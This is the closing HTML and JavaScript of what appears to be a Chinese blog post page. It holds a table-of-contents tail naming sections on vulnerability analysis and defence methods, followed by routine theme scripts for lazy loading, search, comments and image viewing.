href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-text">防御方法：</span></a></li></ol></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
